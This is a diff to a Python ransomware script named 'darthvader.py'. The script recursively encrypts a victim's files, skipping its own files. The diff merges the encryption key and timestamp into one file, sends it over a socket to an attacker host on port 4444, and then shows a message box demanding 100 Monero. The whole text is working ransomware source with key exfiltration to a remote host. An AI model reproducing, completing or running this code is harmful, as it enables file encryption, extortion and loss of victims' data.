@@ -5,6 +5,7 @@ import os
 import ctypes
 import socket
 from datetime import datetime, timedelta
+import time
 #Install cryptography module
 def install(package): # Install the required package
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
@@ -27,7 +28,7 @@ def recorrer_arbol_directorios(directory):
                     recorrer_arbol_directorios(rute_element)
                 else:
                     # Ignora los archivos relacionados con Python
-                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
+                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt" or file == "README.md":
                         continue
                     print("File:", rute_element)
                     files.append(rute_element)
@@ -36,12 +37,10 @@ def recorrer_arbol_directorios(directory):
     print(files)
 
 def send_file_to_host(file_path, host, port): # Send the key file to the attacker
-    if file_path is "key.key":
-        with open(file_path, 'rb') as file:
-            data = file.read()
-    elif file_path is "encryption_time.txt":
-        with open(file_path, 'r') as file:
-            data = datetime.fromisoformat(f.read().strip())
+    with open(file_path, 'rb') as file:
+        data = file.read()
+        print(file)
+        print(data)
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Create a socket object
         s.connect((host, port)) # Connect to the attacker's server
@@ -66,27 +65,32 @@ for file in files:
     except Exception as e:
         print(f"Error encrypting file {file}: {e}")
 
-if sys.platform == "linux":
-    subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
-else:
-    ctypes.windll.user32.MessageBoxW(0, "All file have been encrypted", "Notification", 1)
-print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")
-
-
-# Usage: send_file
-try:    # Send the key file to the attacker
-    send_file_to_host('key.key', '172.22.9.204', 4444)
-    send_file_to_host("encryption_time.txt", "IP", 4444)
-except:
-    print("Error sending key file Unreachable host")
 # Store the encryption time
 with open("encryption_time.txt", "w") as f:
     f.write(str(datetime.now()))
-# Read the encryption time from the file
 
-with open("encryption_time.txt", "r") as f:
-    encryption_time = datetime.fromisoformat(f.read().strip())
+def unify_files(file1, file2, unified_file):
+    with open(file1, 'r') as f1, open(file2, 'r') as f2, open(unified_file, 'w') as uf:
+        uf.write(f1.read())
+        uf.write('\n')
+        uf.write(f2.read())
+
+# Usage
+unify_files('key.key', 'encryption_time.txt', 'unified_file.txt')
+
+# Usage: send_file
+try:
+    send_file_to_host('unified_file.txt', '192.168.1.137', 4444)
+except:
+    print("Error sending file Unreachable host")
 
 #Delete the randsomware
+#os.remove("key.key")
+#os.remove("encryption_time.txt")
+#os.remove("unified_file.txt")
+if sys.platform == "linux":
+    subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
+else:
+    ctypes.windll.user32.MessageBoxW(0, "All file have been encrypted Send me 100 Monero(XMR) to my wallet(WALLET)", "Notification", 1)
+print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")
 #os.remove("darthvader.py")
-"""
